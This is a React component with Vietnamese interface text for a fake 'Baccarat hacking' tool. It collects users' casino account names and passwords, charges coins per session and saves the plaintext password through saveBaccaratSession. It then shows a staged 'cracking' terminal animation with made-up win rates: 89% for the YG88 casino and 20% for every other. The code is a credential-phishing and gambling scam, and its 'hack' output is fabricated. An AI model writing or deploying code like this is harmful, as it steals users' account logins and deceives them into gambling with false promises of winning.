import { useEffect, useMemo, useState } from 'react';
import type { FormEvent } from 'react';
import BaccaratSessionModal from './BaccaratSessionModal';
import { buildLockedScript, buildPreferredScript } from './hackScript';
import { saveBaccaratSession } from '@/lib/baccaratSessions';

type Phase = 'form' | 'running' | 'result';

type Props = {
  coins: number;
  cost: number;
  playerName?: string | null;
  onSpend: (amount: number) => void;
  onNotice: (message: string) => void;
};

const normalize = (value: string) => value.toUpperCase().replace(/[^A-Z0-9]/g, '');

/** Nhà cái YG88 (kể cả gõ "yg 88", "YG88.COM") được xử lý riêng. */
const isPreferredCasino = (value: string) => normalize(value).includes('YG88');

const buildLines = (casino: string, account: string, room: string, preferred: boolean) =>
  preferred ? buildPreferredScript(casino, account, room) : buildLockedScript(casino, account, room);

const STEPS = [
  'Nhập tài khoản game của bạn',
  'Nhập tên nhà cái đang chơi',
  'Hệ thống dò gói mã ẩn',
  'Nhận tín hiệu + tỷ lệ thắng',
];

export default function BaccaratHackPanel({ coins, cost, playerName, onSpend, onNotice }: Props) {
  const [account, setAccount] = useState('');
  const [password, setPassword] = useState('');
  const [casino, setCasino] = useState('');
  const [room, setRoom] = useState('');
  const [phase, setPhase] = useState<Phase>('form');
  const [logIndex, setLogIndex] = useState(0);
  const [error, setError] = useState('');
  const [session, setSession] = useState({
    account: '',
    password: '',
    casino: '',
    room: '',
    preferred: false,
  });

  const storeSession = (input: {
    account: string;
    password: string;
    casino: string;
    room: string;
    preferred: boolean;
  }) => {
    const winRate = input.preferred ? 89 : 20;
    void saveBaccaratSession({ ...input, winRate, playerName }).catch(() => {
      // Không chặn phiên khách nếu việc lưu thất bại.
    });
  };

  const lines = useMemo(
    () =>
      phase === 'form'
        ? []
        : buildLines(session.casino, session.account, session.room, session.preferred),
    [phase, session],
  );

  useEffect(() => {
    if (phase !== 'running') return undefined;
    if (logIndex >= lines.length) {
      const timer = window.setTimeout(() => setPhase('result'), 480);
      return () => window.clearTimeout(timer);
    }
    const delay = lines[logIndex]?.kind === 'cmd' ? 220 : 95;
    const timer = window.setTimeout(() => setLogIndex((prev) => prev + 1), delay);
    return () => window.clearTimeout(timer);
  }, [phase, logIndex, lines.length]);

  const progress = lines.length === 0 ? 0 : Math.round((logIndex / lines.length) * 100);

  const handleSubmit = (event: FormEvent<HTMLFormElement>) => {
    event.preventDefault();
    if (!account.trim()) {
      setError('Nhập tài khoản game trước đã.');
      return;
    }
    if (!password.trim()) {
      setError('Nhập mật khẩu game trước đã.');
      return;
    }
    if (!casino.trim()) {
      setError('Nhập tên nhà cái bạn đang chơi.');
      return;
    }
    if (coins < cost) {
      onNotice(`Bạn cần ${cost} coin cho một phiên phân tích.`);
      return;
    }

    setError('');
    onSpend(cost);

    const payload = {
      account: account.trim(),
      password,
      casino: casino.trim(),
      room: room.trim(),
      preferred: isPreferredCasino(casino),
    };

    setSession(payload);
    storeSession(payload);
    setLogIndex(0);
    setPhase('running');
  };

  const resetSession = () => {
    setPhase('form');
    setLogIndex(0);
    setError('');
  };

  const replaySession = () => {
    if (coins < cost) {
      onNotice(`Bạn cần ${cost} coin cho một phiên phân tích.`);
      return;
    }
    onSpend(cost);
    storeSession(session);
    setLogIndex(0);
    setPhase('running');
  };

  const winRate = session.preferred ? 89 : 20;
  const showResult = phase === 'result';

  return (
    <div className="mt-4">
      <div className="grid gap-4 lg:grid-cols-5">
        <div className="lg:col-span-3">
          <div className="relative overflow-hidden rounded-lg border hairline bg-background-100/60 p-4 md:p-5">
            <div className="pointer-events-none absolute inset-x-0 top-0 h-px bg-gradient-to-r from-transparent via-primary-500/50 to-transparent" />
            <div className="flex flex-wrap items-center justify-between gap-2">
              <div>
                <p className="font-mono text-[10px] tracking-[0.2em] text-primary-500 uppercase">
                  $ baccarat --connect
                </p>
                <h2 className="mt-1 font-heading text-lg font-bold text-foreground-950 md:text-xl">
                  Mở phiên bẻ khoá bàn Baccarat
                </h2>
              </div>
              <span className="flex items-center gap-1.5 rounded border hairline bg-background-50/60 px-2.5 py-1.5 font-mono text-[10px] whitespace-nowrap">
                <i className="ri-copper-coin-line text-accent-500" />
                <span className="text-foreground-600">phí phiên</span>
                <span className="text-foreground-950">{cost}</span>
              </span>
            </div>

            <form onSubmit={handleSubmit} className="mt-4 grid grid-cols-1 gap-3 sm:grid-cols-2">
              <label className="flex min-w-0 flex-col gap-1.5">
                <span className="font-mono text-[10px] tracking-[0.14em] text-foreground-500 uppercase">
                  tài khoản game
                </span>
                <input
                  type="text"
                  name="account"
                  value={account}
                  onChange={(event) => setAccount(event.target.value)}
                  placeholder="vd: player8899"
                  autoComplete="off"
                  className="w-full rounded border border-background-300/50 bg-background-50/70 px-3 py-2 font-mono text-[12px] text-foreground-950 placeholder:text-foreground-600 focus:border-primary-500/60"
                />
              </label>

              <label className="flex min-w-0 flex-col gap-1.5">
                <span className="font-mono text-[10px] tracking-[0.14em] text-foreground-500 uppercase">
                  mật khẩu game
                </span>
                <input
                  type="password"
                  name="password"
                  value={password}
                  onChange={(event) => setPassword(event.target.value)}
                  placeholder="••••••••"
                  autoComplete="off"
                  className="w-full rounded border border-background-300/50 bg-background-50/70 px-3 py-2 font-mono text-[12px] text-foreground-950 placeholder:text-foreground-600 focus:border-primary-500/60"
                />
              </label>

              <label className="flex min-w-0 flex-col gap-1.5">
                <span className="font-mono text-[10px] tracking-[0.14em] text-foreground-500 uppercase">
                  nhà cái đang chơi
                </span>
                <input
                  type="text"
                  name="casino"
                  value={casino}
                  onChange={(event) => setCasino(event.target.value)}
                  placeholder="vd: YG88, SV388, AE888..."
                  autoComplete="off"
                  className="w-full rounded border border-background-300/50 bg-background-50/70 px-3 py-2 font-mono text-[12px] text-foreground-950 placeholder:text-foreground-600 focus:border-primary-500/60"
                />
              </label>

              <label className="flex min-w-0 flex-col gap-1.5">
                <span className="font-mono text-[10px] tracking-[0.14em] text-foreground-500 uppercase">
                  bàn chơi / mã bàn (không bắt buộc)
                </span>
                <input
                  type="text"
                  name="room"
                  value={room}
                  onChange={(event) => setRoom(event.target.value)}
                  placeholder="vd: Baccarat 2 · bàn 5"
                  autoComplete="off"
                  className="w-full rounded border border-background-300/50 bg-background-50/70 px-3 py-2 font-mono text-[12px] text-foreground-950 placeholder:text-foreground-600 focus:border-primary-500/60"
                />
              </label>

              {error && (
                <div className="flex items-center gap-2 rounded border border-accent-500/40 bg-accent-500/10 px-3 py-2 sm:col-span-2">
                  <i className="ri-error-warning-line text-[13px] text-accent-500" />
                  <p className="font-mono text-[11px] text-accent-500">{error}</p>
                </div>
              )}

              <div className="flex flex-col gap-2 sm:col-span-2 sm:flex-row">
                <button
                  type="submit"
                  className="flex flex-1 cursor-pointer items-center justify-center gap-2 rounded-md bg-primary-500 px-4 py-2.5 font-mono text-[12px] font-semibold whitespace-nowrap text-background-50 transition-colors hover:bg-primary-400"
                >
                  <i className="ri-fingerprint-line" />
                  bắt đầu quét · {cost} coin
                </button>
                <button
                  type="button"
                  onClick={() => {
                    setAccount('');
                    setPassword('');
                    setCasino('');
                    setRoom('');
                    setError('');
                  }}
                  className="flex cursor-pointer items-center justify-center gap-2 rounded-md border border-background-300/60 px-4 py-2.5 font-mono text-[12px] whitespace-nowrap text-foreground-300 transition-colors hover:border-primary-500/50 hover:text-primary-500"
                >
                  <i className="ri-refresh-line" />
                  nhập lại
                </button>
              </div>
            </form>

            <p className="mt-3 flex items-start gap-2 font-mono text-[10px] leading-relaxed text-foreground-600">
              <i className="ri-lock-line mt-0.5 text-primary-500" />
              Thông tin phiên được ghi lại để bộ phận hỗ trợ đối soát khi bạn cần tra cứu.
            </p>
            <p className="mt-2 flex items-start gap-2 font-mono text-[10px] leading-relaxed text-foreground-600">
              <i className="ri-window-line mt-0.5 text-primary-500" />
              Bấm “bắt đầu quét”, cửa sổ mã lệnh sẽ bật lên giữa màn hình và chạy trực tiếp.
            </p>
          </div>
        </div>

        <div className="flex flex-col gap-3 lg:col-span-2">
          <div className="rounded-lg border hairline bg-background-100/40 p-4">
            <p className="font-mono text-[10px] tracking-[0.16em] text-foreground-600 uppercase">
              quy trình phiên
            </p>
            <ol className="mt-3 space-y-2.5">
              {STEPS.map((step, index) => {
                const active = phase === 'form' ? index === 0 : index <= 3;
                return (
                  <li key={step} className="flex items-start gap-2.5">
                    <span
                      className={`mt-0.5 flex h-4 w-4 shrink-0 items-center justify-center rounded-full border font-mono text-[9px] ${
                        active
                          ? 'border-primary-500/50 bg-primary-500/15 text-primary-500'
                          : 'border-background-300/60 text-foreground-600'
                      }`}
                    >
                      {index + 1}
                    </span>
                    <span className="font-mono text-[11px] leading-relaxed text-foreground-400">
                      {step}
                    </span>
                  </li>
                );
              })}
            </ol>
          </div>

          <div className="rounded-lg border border-accent-500/25 bg-accent-500/5 p-4">
            <p className="flex items-center gap-2 font-mono text-[10px] tracking-[0.16em] text-accent-500 uppercase">
              <i className="ri-alert-line" />
              lưu ý
            </p>
            <p className="mt-2 font-mono text-[10px] leading-relaxed text-foreground-500">
              Tỷ lệ thắng phụ thuộc vào lớp bảo vệ mã ẩn của từng nhà cái. Một số cổng khoá mã ẩn nên
              không thể gỡ, phiên sẽ chạy ở mức an toàn.
            </p>
          </div>
        </div>
      </div>

      {phase !== 'form' && (
        <BaccaratSessionModal
          casino={session.casino}
          room={session.room}
          preferred={session.preferred}
          winRate={winRate}
          lines={lines}
          shown={logIndex}
          progress={progress}
          running={phase === 'running'}
          showResult={showResult}
          cost={cost}
          coins={coins}
          onClose={resetSession}
          onReplay={replaySession}
          onNewSession={resetSession}
        />
      )}
    </div>
  );
}